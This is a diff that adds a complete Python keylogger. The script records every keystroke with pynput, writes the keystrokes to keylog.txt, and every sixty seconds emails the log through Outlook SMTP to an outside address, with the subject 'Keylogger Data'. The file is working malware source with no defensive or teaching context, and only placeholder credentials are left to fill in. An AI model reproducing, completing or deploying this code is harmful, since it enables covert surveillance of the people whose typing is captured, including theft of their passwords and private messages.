@@ -1,0 +1,71 @@
+import smtplib  
+from email.mime.multipart import MIMEMultipart  
+from email.mime.text import MIMEText  
+import os  
+import pynput.keyboard  
+import threading  
+  
+log = ""  
+filename = "keylog.txt"  
+email_interval = 60  # seconds  
+  
+def append_to_log(string):  
+    global log  
+    log += string  
+  
+def process_key_press(key):  
+    try:  
+        append_to_log(key.char)  
+    except AttributeError:  
+        if key == key.space:  
+            append_to_log(" ")  
+        else:  
+            append_to_log(f" {str(key)} ")  
+  
+def send_email():  
+    from_addr = "your_email@outlook.com"  
+    to_addr = "recepient@gmail.com"  
+    msg = MIMEMultipart()  
+    msg['From'] = from_addr  
+    msg['To'] = to_addr  
+    msg['Subject'] = "Keylogger Data"  
+  
+    body = "Keylogger data attached."  
+    msg.attach(MIMEText(body, 'plain'))  
+  
+    with open(filename, "r") as attachment:  
+        part = MIMEText(attachment.read(), 'plain')  
+        part.add_header('Content-Disposition', f'attachment; filename={filename}')  
+        msg.attach(part)  
+  
+    server = smtplib.SMTP('smtp.outlook.com', 587)  
+    server.starttls()  
+    server.login(from_addr, "your_passoword:")  
+    text = msg.as_string()  
+    server.sendmail(from_addr, to_addr, text)  
+    server.quit()  
+    print("Email sent successfully.")  
+  
+def report():  
+    global log  
+    with open(filename, "a") as f:  
+        f.write(log)  
+    log = ""  
+    send_email()  
+    timer = threading.Timer(email_interval, report)  
+    timer.start()  
+  
+def start_keylogger():  
+    keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)  
+    with keyboard_listener:  
+        report()  
+        keyboard_listener.join()  
+  
+# Create the keylog file if it does not exist  
+if not os.path.exists(filename):  
+    with open(filename, "w") as f:  
+        f.write("")  
+  
+# Start the keylogger  
+start_keylogger()
+
